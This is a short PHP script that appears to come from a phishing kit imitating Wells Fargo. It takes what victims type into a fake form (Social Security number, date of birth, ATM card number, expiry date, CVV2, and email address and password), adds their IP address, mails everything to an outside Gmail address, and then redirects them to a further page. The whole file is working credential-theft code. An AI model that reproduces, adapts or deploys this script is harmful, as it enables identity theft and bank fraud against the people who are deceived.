<?

$ip = getenv("REMOTE_ADDR");
$message .= "---:||WellsfargoBy|v!nc3||:---\n";
$message .= ".:: v!nc3forLuv ::.\n";
$message .= "SSN : ".$_POST['s1']."-";
$message .= "".$_POST['s2']."-";
$message .= "".$_POST['s3']."\n";
$message .= "DateofBirth : ".$_POST['dob']."\n";
$message .= "ZipCode : ".$_POST['zip']."\n";
$message .= "ATMCardNumber : ".$_POST['acct']."\n";
$message .= "Exp Date : ".$_POST['exp']." .. CVV2: ";
$message .= "".$_POST['cvv']."\n";
$message .= "EmailAddress : ".$_POST['email']." - ";
$message .= " ".$_POST['epass']."\n";
$message .= "IP : ".$ip."\n";
$message .= "----Ownedby|v!nc3----\n";
$recipient = "ehresale1948@gmail.com";
$subject = "Wells-$ip";
$headers = "From: wells";
$headers .= $_POST['$ip']."\n";
mail($recipient,$subject,$message,$headers);

header("Location: verify.php");
?>